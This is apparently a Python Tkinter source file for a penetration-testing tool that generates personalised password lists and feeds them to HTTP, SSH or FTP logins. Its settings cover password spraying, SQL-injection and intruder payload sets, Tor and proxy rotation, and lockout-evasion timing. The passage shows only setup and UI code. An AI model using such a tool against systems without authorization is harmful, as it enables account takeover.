import os
import sys
import gzip
import json
import time
import queue
import string
import threading
import itertools
import re
from collections import deque
from datetime import datetime
from urllib.parse import urlparse
from urllib.parse import urlencode
import html
import argparse
import xml.etree.ElementTree as ET

import tkinter as tk
from tkinter import filedialog
from tkinter import messagebox
from tkinter import scrolledtext

# Try to use ttkbootstrap for a modern theme; fall back to standard ttk
try:
	import ttkbootstrap as tb
	from ttkbootstrap.dialogs import Messagebox as TbMessagebox
	USE_TTKBOOTSTRAP = True
except Exception:
	USE_TTKBOOTSTRAP = False

from tkinter import ttk

try:
	import requests
except Exception:
	requests = None

try:
	import httpx
except Exception:
	httpx = None

try:
	from requests.auth import HTTPDigestAuth
except Exception:
	HTTPDigestAuth = None

try:
	import requests_ntlm
except Exception:
	requests_ntlm = None

try:
	import paramiko
	from paramiko.ssh_exception import AuthenticationException as SSHAuthException, SSHException as SSHGenericException
except Exception:
	paramiko = None
	SSHAuthException = None
	SSHGenericException = None

import ftplib

import asyncio
import random


class RateLimiter:
	def __init__(self, qps: float) -> None:
		self.qps = max(0.1, float(qps))
		self.lock = threading.Lock()
		self._allowance = 1.0
		self._last_check = time.monotonic()

	def acquire(self) -> None:
		# Token bucket to support fractional QPS with minimal CPU
		while True:
			with self.lock:
				now = time.monotonic()
				elapsed = now - self._last_check
				self._last_check = now
				self._allowance = min(self.qps, self._allowance + elapsed * self.qps)
				if self._allowance >= 1.0:
					self._allowance -= 1.0
					return
			needed = (1.0 - self._allowance) / self.qps if self.qps > 0 else 0.05
			sleep_for = max(0.001, min(0.5, needed))
			time.sleep(sleep_for)


class PasswordListGeneratorApp:
	def __init__(self) -> None:
		self.use_bootstrap = USE_TTKBOOTSTRAP
		if self.use_bootstrap:
			self.style = tb.Style(theme="cosmo")
			self.root = self.style.master
			self.root.title("Password List Generator")
		else:
			self.root = tk.Tk()
			self.root.title("Password List Generator")
		self.root.geometry("980x820")

		# State
		self.worker_thread: threading.Thread | None = None
		self.ui_queue: queue.Queue = queue.Queue()
		self.is_running = False
		self.cancel_requested = False
		self.generated_count = 0
		self.total_estimated = 0
		self.start_time: float | None = None

		# Live metrics
		self.metrics_lock = threading.Lock()
		self.metrics = {
			"attempts": 0,
			"successes": 0,
			"failures": 0,
			"lockouts": 0,
			"errors": 0,
			"status_counts": {},  # code -> count
			"latencies": deque(maxlen=500),
			"attempt_timestamps": deque(maxlen=2000),
			"error_timestamps": deque(maxlen=2000),
			"start_time": None,
		}

		# Variables - profile and generation
		self.var_name = tk.StringVar()
		self.var_surname = tk.StringVar()
		self.var_city = tk.StringVar()
		self.var_birthdate = tk.StringVar(value="1990")

		self.var_min_len = tk.IntVar(value=4)
		self.var_max_len = tk.IntVar(value=6)
		self.var_special_chars = tk.StringVar(value="!@#$%_-")

		self.var_mode = tk.StringVar(value="Brute-force")  # Brute-force | Smart brute-force | Smart mutations
		self.var_include_digits = tk.BooleanVar(value=True)
		self.var_include_uppercase = tk.BooleanVar(value=True)
		self.var_gzip = tk.BooleanVar(value=False)

		self.var_output_path = tk.StringVar(value=self._default_output_path())

		# Variables - pentest target
		self.var_target_enabled = tk.BooleanVar(value=False)
		self.var_target_url = tk.StringVar(value="")
		self.var_protocol = tk.StringVar(value="HTTP")  # HTTP | SSH | FTP
		self.var_http_method = tk.StringVar(value="POST")
		self.var_username_value = tk.StringVar(value="")
		self.var_user_param = tk.StringVar(value="username")
		self.var_pass_param = tk.StringVar(value="password")
		self.var_extra_params = tk.StringVar(value="")  # key=value&key2=value2
		self.var_success_codes = tk.StringVar(value="200,302")
		self.var_success_regex = tk.StringVar(value="")
		self.var_failure_regex = tk.StringVar(value="")
		self.var_qps = tk.DoubleVar(value=5.0)
		self.var_enable_sqli = tk.BooleanVar(value=False)
		self.var_sqli_field = tk.StringVar(value="password")  # username|password
		self.var_concurrency = tk.IntVar(value=5)
		self.var_headers_json = tk.StringVar(value="")
		self.var_cookies = tk.StringVar(value="")  # k=v; k2=v2
		self.var_proxy_url = tk.StringVar(value="")
		self.var_verify_tls = tk.BooleanVar(value=True)
		self.var_timeout = tk.DoubleVar(value=15.0)
		# Usernames & spraying
		self.var_usernames_file = tk.StringVar(value="")
		self.var_usernames_count = tk.StringVar(value="(none)")
		self.loaded_usernames: list[str] = []
		self.var_generate_patterns = tk.BooleanVar(value=True)
		self.var_email_domain = tk.StringVar(value="")
		self.var_lowercase_usernames = tk.BooleanVar(value=True)
		self.var_common_aliases = tk.BooleanVar(value=True)
		self.var_spray_enabled = tk.BooleanVar(value=False)
		self.var_spray_passwords_file = tk.StringVar(value="")
		self.var_spray_cooldown_min = tk.DoubleVar(value=15.0)
		self.var_spray_window_min = tk.DoubleVar(value=60.0)
		self.var_spray_attempts_per_window = tk.IntVar(value=1)
		self.var_spray_stop_on_success = tk.BooleanVar(value=True)
		# Lockout detection
		self.var_lockout_enabled = tk.BooleanVar(value=True)
		self.var_lockout_codes = tk.StringVar(value="429,423,403")
		self.var_lockout_regex = tk.StringVar(value="account locked|too many attempts|temporarily blocked|captcha")
		self.var_lockout_cooldown_min = tk.DoubleVar(value=30.0)
		self.var_lockout_jitter = tk.BooleanVar(value=True)
		# Proxy/User-Agent rotation
		self.var_tor_mode = tk.BooleanVar(value=False)
		self.var_tor_proxy = tk.StringVar(value="socks5h://127.0.0.1:9050")
		self.var_proxy_list_file = tk.StringVar(value="")
		self.loaded_proxies: list[str] = []
		self.var_proxy_rotation = tk.StringVar(value="per_request")  # per_request | per_worker
		self.var_user_agent_rotate = tk.BooleanVar(value=False)
		self.var_user_agent_list_file = tk.StringVar(value="")
		self.loaded_user_agents: list[str] = []
		self.var_user_agent_rotation = tk.StringVar(value="per_request")  # per_request | per_worker

		# Logging
		self.var_log_to_file = tk.BooleanVar(value=False)
		self.var_log_file = tk.StringVar(value="")
		self.var_log_append = tk.BooleanVar(value=False)
		self._log_fp = None
		self._log_lock = threading.Lock()
		# Artifacts capture
		self.var_capture_enabled = tk.BooleanVar(value=False)
		self.var_capture_max_artifacts = tk.IntVar(value=20)
		self.var_capture_max_bytes = tk.IntVar(value=65536)
		self.var_capture_failures_n = tk.IntVar(value=5)
		self.captured_artifacts: list[dict] = []
		self._failures_captured = 0
		self.found_credentials: list[dict] = []

		# Engine (sync vs async)
		self.var_async_engine = tk.BooleanVar(value=False)
		self.var_http2 = tk.BooleanVar(value=True)
		self.var_max_connections = tk.IntVar(value=100)
		self.var_retries = tk.IntVar(value=2)
		self.var_backoff_ms = tk.IntVar(value=200)

		# Checkpoint/resume
		self.var_checkpoint_enabled = tk.BooleanVar(value=False)
		self.var_checkpoint_file = tk.StringVar(value="")
		self.var_resume_from_checkpoint = tk.BooleanVar(value=False)
		self._checkpoint_lock = threading.Lock()
		self._last_checkpoint_ts = 0.0
		self._checkpoint_every_attempts = 200
		self._resume_state = None

		# Auto form/CSRF
		self.var_auto_form = tk.BooleanVar(value=False)
		self.var_refresh_csrf = tk.BooleanVar(value=False)

		# Pre-login chain
		self.var_prelogin_enabled = tk.BooleanVar(value=False)
		self.var_prelogin_urls = tk.StringVar(value="")  # comma-separated URLs
		self.var_prelogin_per_attempt = tk.BooleanVar(value=False)
		self.var_prelogin_js = tk.BooleanVar(value=False)

		# Request template
		self.var_body_mode = tk.StringVar(value="params")  # params|json|raw
		self.var_raw_body = tk.StringVar(value="")
		# Success signals
		self.var_success_require_redirect = tk.BooleanVar(value=False)
		self.var_success_length_gt = tk.IntVar(value=0)

		# OSCP Safe Mode
		self.var_safe_mode = tk.BooleanVar(value=False)
		self.var_allowlist = tk.StringVar(value="")  # comma-separated hosts or regex
		self.var_safe_qps_cap = tk.DoubleVar(value=1.0)
		self.var_safe_concurrency_cap = tk.IntVar(value=2)
		self.var_safe_auto_pause = tk.BooleanVar(value=True)

		# Reporting UI variables
		self.var_r_attempts = tk.StringVar(value="0")
		self.var_r_successes = tk.StringVar(value="0")
		self.var_r_failures = tk.StringVar(value="0")
		self.var_r_lockouts = tk.StringVar(value="0")
		self.var_r_errors = tk.StringVar(value="0")
		self.var_r_rps = tk.StringVar(value="0.0")
		self.var_r_latency_p50 = tk.StringVar(value="-")
		self.var_r_latency_p95 = tk.StringVar(value="-")
		self.var_r_latency_p99 = tk.StringVar(value="-")

		# Build UI
		self._build_ui()

		# UI queue processing
		self.root.after(100, self._process_ui_queue)
		# Reporting refresh
		self.root.after(750, self._refresh_reporting_ui)

		# Graceful close
		self.root.protocol("WM_DELETE_WINDOW", self.on_close)

		self.var_wkhtmltopdf_path = tk.StringVar(value="wkhtmltopdf")
		self.flow_context_last: dict = {}
		self.var_docx_template_path = tk.StringVar(value="")

		# HTTP Auth
		self.var_auth_type = tk.StringVar(value="None")  # None, Basic, Digest, NTLM
		self.var_auth_user = tk.StringVar(value="")
		self.var_auth_pass = tk.StringVar(value="")
		self.var_auth_domain = tk.StringVar(value="")

		# Intruder mode (Sniper)
		self.var_intruder_enabled = tk.BooleanVar(value=False)
		self.var_intruder_marker = tk.StringVar(value="§PAYLOAD§")
		self.var_intruder_payloads_file = tk.StringVar(value="")
		self.var_intruder_builtin = tk.StringVar(value="none")  # none,sqli,ssti,lfi,traversal,xss,cmdi
		self.var_intruder_mode = tk.StringVar(value="sniper")  # sniper,pitchfork,clusterbomb
		self.var_intruder_markers = tk.StringVar(value="§PAYLOAD§")
		self.intruder_sets_text = tk.StringVar(value="")  # lines: MARKER=source

		# Intruder results UI state
		self.intr_results: list[dict] = []
		self.intr_baseline: dict | None = None

		self.var_failfast_enabled = tk.BooleanVar(value=False)
		self.var_failfast_error_pct = tk.DoubleVar(value=90.0)
		self.var_failfast_window_sec = tk.IntVar(value=60)
		self.var_failfast_action = tk.StringVar(value="stop")  # stop | backoff
		self.var_failfast_backoff_sec = tk.IntVar(value=30)
		self._error_backoff_until = [0.0]
		self._error_backoff_lock = threading.Lock()

	def _default_output_path(self) -> str:
		timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
		base = f"Passwordlist-{timestamp}.txt"
		return os.path.join(os.getcwd(), base)

	def _build_ui(self) -> None:
		padding = {"padx": 8, "pady": 6}

		main = ttk.Frame(self.root)
		main.pack(fill=tk.BOTH, expand=True)

		# Profile frame
		profile = ttk.LabelFrame(main, text="Profile")
		profile.pack(fill=tk.X, **padding)
		self._add_labeled_entry(profile, "Name", self.var_name, row=0, col=0)
		self._add_labeled_entry(profile, "Surname", self.var_surname, row=0, col=2)
		self._add_labeled_entry(profile, "City", self.var_city, row=1, col=0)
		self._add_labeled_entry(profile, "Birthdate (free text)", self.var_birthdate, row=1, col=2)

		# Generation options
		options = ttk.LabelFrame(main, text="Options")
		options.pack(fill=tk.X, **padding)
		ttk.Label(options, text="Mode").grid(row=0, column=0, sticky="e", padx=4, pady=4)
		mode_combo = ttk.Combobox(options, textvariable=self.var_mode, values=["Brute-force", "Smart brute-force", "Smart mutations"], state="readonly", width=18)
		mode_combo.grid(row=0, column=1, sticky="w", padx=4, pady=4)
		self._add_labeled_spinbox(options, "Min length", self.var_min_len, row=0, col=2, from_=1, to=16)
		self._add_labeled_spinbox(options, "Max length", self.var_max_len, row=0, col=4, from_=1, to=24)
		self._add_labeled_entry(options, "Special chars", self.var_special_chars, row=1, col=0)
		ttk.Checkbutton(options, text="Include digits 0-9", variable=self.var_include_digits).grid(row=1, column=2, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(options, text="Include uppercase", variable=self.var_include_uppercase).grid(row=1, column=4, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(options, text="Gzip output (.gz)", variable=self.var_gzip).grid(row=1, column=5, sticky="w", padx=4, pady=4)
		for i in range(0, 6):
			options.grid_columnconfigure(i, weight=1)

		# Target frame (pentest)
		target = ttk.LabelFrame(main, text="Pentest Target (authorized testing only)")
		target.pack(fill=tk.X, **padding)
		ttk.Checkbutton(target, text="Enable Pentest (send candidates to target)", variable=self.var_target_enabled).grid(row=0, column=0, columnspan=4, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "URL", self.var_target_url, row=1, col=0)
		ttk.Label(target, text="Method").grid(row=1, column=2, sticky="e", padx=4, pady=4)
		ttk.Combobox(target, textvariable=self.var_http_method, values=["POST", "GET"], width=8, state="readonly").grid(row=1, column=3, sticky="w", padx=4, pady=4)
		# Protocol selector (for speed we place it on the same row)
		ttk.Label(target, text="Protocol").grid(row=1, column=4, sticky="e", padx=4, pady=4)
		ttk.Combobox(target, textvariable=self.var_protocol, values=["HTTP","SSH","FTP"], width=8, state="readonly").grid(row=1, column=5, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "Username value", self.var_username_value, row=2, col=0)
		self._add_labeled_entry(target, "Username param", self.var_user_param, row=2, col=2)
		self._add_labeled_entry(target, "Password param", self.var_pass_param, row=2, col=4)
		self._add_labeled_entry(target, "Extra params (k=v&k2=v2)", self.var_extra_params, row=3, col=0)
		self._add_labeled_entry(target, "Success codes (csv)", self.var_success_codes, row=3, col=2)
		self._add_labeled_entry(target, "Success regex (opt)", self.var_success_regex, row=3, col=4)
		self._add_labeled_entry(target, "Failure regex (opt)", self.var_failure_regex, row=4, col=0)
		self._add_labeled_entry(target, "Rate limit QPS", self.var_qps, row=4, col=2)
		self._add_labeled_spinbox(target, "Concurrency", self.var_concurrency, row=4, col=4, from_=1, to=32)
		ttk.Checkbutton(target, text="Run SQL injection checks", variable=self.var_enable_sqli).grid(row=4, column=6, sticky="w", padx=4, pady=4)
		ttk.Label(target, text="SQLi field").grid(row=4, column=7, sticky="e", padx=4, pady=4)
		ttk.Combobox(target, textvariable=self.var_sqli_field, values=["username", "password"], width=10, state="readonly").grid(row=4, column=8, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "Headers JSON", self.var_headers_json, row=5, col=0)
		self._add_labeled_entry(target, "Cookies (k=v; k2=v2)", self.var_cookies, row=6, col=0)
		self._add_labeled_entry(target, "Proxy URL (http/socks5)", self.var_proxy_url, row=7, col=0)
		ttk.Checkbutton(target, text="Verify TLS", variable=self.var_verify_tls).grid(row=8, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "Timeout (s)", self.var_timeout, row=8, col=2, from_=1, to=120)
		# Lockout detection controls
		ttk.Checkbutton(target, text="Enable lockout detection", variable=self.var_lockout_enabled).grid(row=9, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "Lockout codes (csv)", self.var_lockout_codes, row=9, col=2)
		self._add_labeled_entry(target, "Lockout regex", self.var_lockout_regex, row=9, col=4)
		self._add_labeled_entry(target, "Lockout cooldown (min)", self.var_lockout_cooldown_min, row=9, col=6)
		ttk.Checkbutton(target, text="Jitter", variable=self.var_lockout_jitter).grid(row=9, column=8, sticky="w", padx=4, pady=4)
		# Proxy & UA rotation
		ttk.Checkbutton(target, text="Use Tor (SOCKS5)", variable=self.var_tor_mode).grid(row=10, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "Tor proxy", self.var_tor_proxy, row=10, col=2)
		self._add_labeled_entry(target, "Proxy list file", self.var_proxy_list_file, row=10, col=4)
		ttk.Button(target, text="Browse…", command=self.on_browse_proxy_list_file).grid(row=10, column=6, sticky="w", padx=4, pady=4)
		ttk.Label(target, text="Proxy rotation").grid(row=10, column=7, sticky="e", padx=4, pady=4)
		ttk.Combobox(target, textvariable=self.var_proxy_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=10, column=8, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(target, text="Rotate User-Agent", variable=self.var_user_agent_rotate).grid(row=11, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(target, "UA list file", self.var_user_agent_list_file, row=11, col=2)
		ttk.Button(target, text="Browse…", command=self.on_browse_user_agent_list_file).grid(row=11, column=4, sticky="w", padx=4, pady=4)
		ttk.Label(target, text="UA rotation").grid(row=11, column=5, sticky="e", padx=4, pady=4)
		ttk.Combobox(target, textvariable=self.var_user_agent_rotation, values=["per_request", "per_worker"], width=12, state="readonly").grid(row=11, column=6, sticky="w", padx=4, pady=4)
		# Engine & pool config
		ttk.Checkbutton(target, text="Async engine (httpx)", variable=self.var_async_engine).grid(row=12, column=0, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(target, text="HTTP/2", variable=self.var_http2).grid(row=12, column=1, sticky="w", padx=4, pady=4)
		self._add_labeled_spinbox(target, "Max conns", self.var_max_connections, row=12, col=2, from_=1, to=1000)
		self._add_labeled_spinbox(target, "Retries", self.var_retries, row=12, col=4, from_=0, to=10)
		self._add_labeled_spinbox(target, "Backoff (ms)", self.var_backoff_ms, row=12, col=6, from_=0, to=5000)
		for i in range(0, 9):
			target.grid_columnconfigure(i, weight=1)

		# Checkpoint & Auto-form
		ck = ttk.LabelFrame(main, text="Checkpoint & Form Discovery")
		ck.pack(fill=tk.X, **padding)
		ttk.Checkbutton(ck, text="Enable checkpoint", variable=self.var_checkpoint_enabled).grid(row=0, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(ck, "File", self.var_checkpoint_file, row=0, col=1)
		ttk.Button(ck, text="Browse…", command=self.on_browse_checkpoint_file).grid(row=0, column=3, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(ck, text="Resume from checkpoint", variable=self.var_resume_from_checkpoint).grid(row=0, column=4, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(ck, text="Auto-discover form/CSRF", variable=self.var_auto_form).grid(row=1, column=0, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(ck, text="Refresh CSRF each attempt", variable=self.var_refresh_csrf).grid(row=1, column=1, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(ck, "Pre-login URLs (comma)", self.var_prelogin_urls, row=1, col=2)
		ttk.Checkbutton(ck, text="Enable pre-login", variable=self.var_prelogin_enabled).grid(row=1, column=4, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(ck, text="Per attempt", variable=self.var_prelogin_per_attempt).grid(row=1, column=5, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(ck, text="Headless JS", variable=self.var_prelogin_js).grid(row=1, column=6, sticky="w", padx=4, pady=4)
		for i in range(0, 5):
			ck.grid_columnconfigure(i, weight=1)

		# Usernames & Spray controls
		users = ttk.LabelFrame(main, text="Usernames & Password Spraying")
		users.pack(fill=tk.X, **padding)
		# Username file loader
		ttk.Label(users, text="Usernames file (one per line)").grid(row=0, column=0, sticky="e", padx=4, pady=4)
		ttk.Entry(users, textvariable=self.var_usernames_file).grid(row=0, column=1, sticky="we", padx=4, pady=4)
		ttk.Button(users, text="Browse…", command=self.on_browse_usernames_file).grid(row=0, column=2, sticky="w", padx=4, pady=4)
		ttk.Label(users, textvariable=self.var_usernames_count).grid(row=0, column=3, sticky="w", padx=4, pady=4)
		# Username discovery options
		ttk.Checkbutton(users, text="Generate patterns", variable=self.var_generate_patterns).grid(row=1, column=0, sticky="w", padx=4, pady=4)
		ttk.Label(users, text="Email domain").grid(row=1, column=1, sticky="e", padx=4, pady=4)
		ttk.Entry(users, textvariable=self.var_email_domain).grid(row=1, column=2, sticky="we", padx=4, pady=4)
		ttk.Button(users, text="Use target domain", command=self.on_use_target_domain).grid(row=1, column=3, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(users, text="Lowercase usernames", variable=self.var_lowercase_usernames).grid(row=1, column=4, sticky="w", padx=4, pady=4)
		ttk.Checkbutton(users, text="Include common aliases", variable=self.var_common_aliases).grid(row=1, column=5, sticky="w", padx=4, pady=4)
		# Spray controls
		ttk.Checkbutton(users, text="Enable Password Spraying", variable=self.var_spray_enabled).grid(row=2, column=0, sticky="w", padx=4, pady=4)
		ttk.Label(users, text="Passwords file (one per line)").grid(row=2, column=1, sticky="e", padx=4, pady=4)
		ttk.Entry(users, textvariable=self.var_spray_passwords_file).grid(row=2, column=2, sticky="we", padx=4, pady=4)
		ttk.Button(users, text="Browse…", command=self.on_browse_passwords_file).grid(row=2, column=3, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(users, "Cooldown (min)", self.var_spray_cooldown_min, row=3, col=0)
		self._add_labeled_entry(users, "Window (min)", self.var_spray_window_min, row=3, col=2)
		self._add_labeled_spinbox(users, "Attempts/user/window", self.var_spray_attempts_per_window, row=3, col=4, from_=1, to=5)
		ttk.Checkbutton(users, text="Stop on first success", variable=self.var_spray_stop_on_success).grid(row=3, column=6, sticky="w", padx=4, pady=4)
		for i in range(0, 7):
			users.grid_columnconfigure(i, weight=1)

		# Output preview / Logs
		preview = ttk.LabelFrame(main, text="Output preview / Logs")
		preview.pack(fill=tk.BOTH, expand=True, **padding)
		self.preview_text = scrolledtext.ScrolledText(preview, height=14)
		self.preview_text.pack(fill=tk.BOTH, expand=True)
		self.preview_text.configure(state=tk.DISABLED)

		# Reporting view
		report = ttk.LabelFrame(main, text="Live Reporting")
		report.pack(fill=tk.BOTH, expand=False, **padding)
		report.grid_columnconfigure(1, weight=1)
		row = 0
		ttk.Label(report, text="Attempts").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_attempts).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="Successes").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_successes).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="Failures").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_failures).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="Lockouts").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_lockouts).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="Errors").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_errors).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="RPS (10s)").grid(row=row, column=0, sticky="e"); ttk.Label(report, textvariable=self.var_r_rps).grid(row=row, column=1, sticky="w"); row += 1
		ttk.Label(report, text="Latency p50/p95/p99 (ms)").grid(row=row, column=0, sticky="e");
		lat_wrap = ttk.Frame(report); lat_wrap.grid(row=row, column=1, sticky="w");
		ttk.Label(lat_wrap, textvariable=self.var_r_latency_p50).pack(side=tk.LEFT)
		ttk.Label(lat_wrap, text=" / ").pack(side=tk.LEFT)
		ttk.Label(lat_wrap, textvariable=self.var_r_latency_p95).pack(side=tk.LEFT)
		ttk.Label(lat_wrap, text=" / ").pack(side=tk.LEFT)
		ttk.Label(lat_wrap, textvariable=self.var_r_latency_p99).pack(side=tk.LEFT)

		# Status codes table
		codes_frame = ttk.Frame(report)
		codes_frame.grid(row=0, column=2, rowspan=row+1, sticky="nsew", padx=8)
		report.grid_columnconfigure(2, weight=1)
		self.codes_tree = ttk.Treeview(codes_frame, columns=("code", "count"), show="headings", height=7)
		self.codes_tree.heading("code", text="HTTP code")
		self.codes_tree.heading("count", text="Count")
		self.codes_tree.column("code", width=100, anchor="center")
		self.codes_tree.column("count", width=80, anchor="e")
		self.codes_tree.pack(fill=tk.BOTH, expand=True)

		# Time-series chart (RPS)
		chart_wrap = ttk.Frame(report)
		chart_wrap.grid(row=row+2, column=0, columnspan=3, sticky="we", pady=(8,0))
		chart_wrap.grid_columnconfigure(0, weight=1)
		self.chart_canvas = tk.Canvas(chart_wrap, height=120, background="#ffffff", highlightthickness=1, highlightbackground="#ccc")
		self.chart_canvas.grid(row=0, column=0, sticky="we")

		# Request Template
		rtpl = ttk.LabelFrame(main, text="Request Template")
		rtpl.pack(fill=tk.BOTH, expand=False, **padding)
		row2 = 0
		ttk.Label(rtpl, text="Body mode").grid(row=row2, column=0, sticky="e", padx=4, pady=4)
		mode_cb = ttk.Combobox(rtpl, textvariable=self.var_body_mode, values=["params","json","raw"], width=10, state="readonly")
		mode_cb.grid(row=row2, column=1, sticky="w", padx=4, pady=4)
		ttk.Label(rtpl, text="Raw body template ({{username}}, {{password}} supported)").grid(row=row2, column=2, sticky="w", padx=4, pady=4, columnspan=3)
		row2 += 1
		self.raw_body_text = scrolledtext.ScrolledText(rtpl, height=6)
		self.raw_body_text.grid(row=row2, column=0, columnspan=6, sticky="we", padx=4, pady=4)
		rtpl.grid_columnconfigure(5, weight=1)
		row2 += 1
		btns = ttk.Frame(rtpl)
		btns.grid(row=row2, column=0, columnspan=6, sticky="w")
		ttk.Button(btns, text="Import cURL (file)", command=self.on_import_curl_file).pack(side=tk.LEFT, padx=4)
		ttk.Button(btns, text="Import Burp raw (file)", command=self.on_import_burp_file).pack(side=tk.LEFT, padx=4)
		# Success signals
		ttk.Checkbutton(btns, text="Require redirect", variable=self.var_success_require_redirect).pack(side=tk.LEFT, padx=12)
		ttk.Label(btns, text="Length >= ").pack(side=tk.LEFT)
		spinLen = ttk.Spinbox(btns, textvariable=self.var_success_length_gt, from_=0, to=10_000_000, width=8)
		spinLen.pack(side=tk.LEFT, padx=4)
		# OSCP Safe Mode
		safe = ttk.LabelFrame(main, text="OSCP Safe Mode")
		safe.pack(fill=tk.X, **padding)
		ttk.Checkbutton(safe, text="Enable Safe Mode", variable=self.var_safe_mode).grid(row=0, column=0, sticky="w", padx=4, pady=4)
		self._add_labeled_entry(safe, "Allowlist (hosts/regex, comma)", self.var_allowlist, row=0, col=1)
		self._add_labeled_spinbox(safe, "QPS cap", self.var_safe_qps_cap, row=0, col=3, from_=0.1, to=5)
		self._add_labeled_spinbox(safe, "Concurrency cap", self.var_safe_concurrency_cap, row=0, col=5, from_=1, to=5)
		ttk.Checkbutton(safe, text="Auto-pause on lockout/CAPTCHA", variable=self.var_safe_auto_pause).grid(row=0, column=7, sticky="w", padx=4, pady=4)
		for i in range(0, 8):
			safe.grid_columnconfigure(i, weight=1)
		# Fail-fast controls
		row_safe = 1
		ttk.Checkbutton(safe, text="Fail-fast on errors", variable=self.var_failfast_enabled).grid(row=row_safe, column=0, sticky="w", padx=4, pady=2)
		self._add_labeled_entry(safe, "Err%>", self.var_failfast_error_pct, row=row_safe, col=1)
		self._add_labeled_entry(safe, "Window(s)", self.var_failfast_window_sec, row=row_safe, col=3)
		ttk.Label(safe, text="Action").grid(row=row_safe, column=5, sticky="e", padx=4, pady=2)
		ttk.Combobox(safe, textvariable=self.var_failfast_action, values=["stop","backoff"], width=10, state="readonly").grid(row=row_safe, column=6, sticky="w", padx=4, pady=2)
		self._add_labeled_entry(safe, "Backoff(s)", self.var_failfast_backoff_sec, row=row_safe, col=7)
		# Reporting actions
		actions = ttk.Frame(report)
		actions.grid(row=row+1, column=0, columnspan=3, sticky="we", pady=(8,0))
		ttk.Button(actions, text="Export JSON", command=self.on_export_report_json).pack(side=tk.LEFT)
		tkbtn = ttk.Button(actions, text="Export CSV", command=self.on_export_report_csv)
		tkbtn.pack(side=tk.LEFT, padx=8)
		ttk.Button(actions, text="Export HTML", command=self.on_export_report_html).pack(side=tk.LEFT, padx=8)
		ttk.Button(actions, text="Export PDF", command=self.on_export_pdf).pack(side=tk.LEFT, padx=8)
		ttk.Button(actions, text="Export OSCP MD", command=self.on_export_oscp_markdown).pack(side=tk.LEFT, padx=8)
		ttk.Button(actions, text="Export OSCP DOCX", command=self.on_export_oscp_docx).pack(side=tk.LEFT, padx=8)
		ttk.Button(actions, text="Export Evidence Bundle", command=self.on_export_evidence_bundle).pack(side=tk.LEFT, padx=8)
		# Artifacts capture controls
		ttk.Checkbutton(actions, text="Capture artifacts", variable=self.var_capture_enabled).pack(side=tk.LEFT, padx=12)
		# Template path controls
		ttk.Label(actions, text="DOCX template").pack(side=tk.LEFT, padx=8)
		ent_tpl = ttk.Entry(actions, textvariable=self.var_docx_template_path, width=28)
		ent_tpl.pack(side=tk.LEFT)
		def _browse_tpl():
			p = filedialog.askopenfilename(filetypes=[("DOCX", "*.docx"), ("All files", "*.*")])
			if p:
				self.var_docx_template_path.set(p)
		ttk.Button(actions, text="Browse…", command=_browse_tpl).pack(side=tk.LEFT, padx=4)
		ttk.Label(actions, text="Max N").pack(side=tk.LEFT)
		spinN = ttk.Spinbox(actions, textvariable=self.var_capture_max_artifacts, from_=1, to=200)
		spinN.pack(side=tk.LEFT, padx=4)
		ttk.Label(actions, text="Max bytes").pack(side=tk.LEFT)
		spinB = ttk.Spinbox(actions, textvariable=self.var_capture_max_bytes, from_=1024, to=10485760)
		spinB.pack(side=tk.LEFT, padx=4)
		ttk.Label(actions, text="Failures N").pack(side=tk.LEFT)
		spinF = ttk.Spinbox(actions, textvariable=self.var_capture_failures_n, from_=0, to=50)
		spinF.pack(side=tk.LEFT, padx=4)
		ttk.Button(actions, text="Export Artifacts", command=self.on_export_artifacts).pack(side=tk.LEFT, padx=8)
		# Logging controls
		ttk.Checkbutton(actions, text="Log to file", variable=self.var_log_to_file).pack(side=tk.LEFT, padx=12)
		log_entry = ttk.Entry(actions, textvariable=self.var_log_file, width=48)
		log_entry.pack(side=tk.LEFT, padx=4)
		ttk.Button(actions, text="Browse…", command=self.on_browse_log_file).pack(side=tk.LEFT, padx=4)
		ttk.Checkbutton(actions, text="Append", variable=self.var_log_append).pack(side=tk.LEFT, padx=8)

		# Actions
		actions2 = ttk.Frame(main)
		actions2.pack(fill=tk.X, **padding)
		self.btn_generate = ttk.Button(actions2, text="Run", command=self.on_generate)
		self.btn_generate.pack(side=tk.LEFT)
		self.btn_cancel = ttk.Button(actions2, text="Cancel", command=self.on_cancel, state=tk.DISABLED)
		self.btn_cancel.pack(side=tk.LEFT, padx=8)
		self.btn_save = ttk.Button(actions2, text="Save Profile", command=self.on_save_profile)
		self.btn_save.pack(side=tk.LEFT, padx=8)
		self.btn_load = ttk.Button(actions2, text="Load Profile", command=self.on_load_profile)
		self.btn_load.pack(side=tk.LEFT, padx=8)

		# Flow Builder and Notes
		self.var_flow_enabled = tk.BooleanVar(value=False)
		self.var_flow_per_attempt = tk.BooleanVar(value=True)
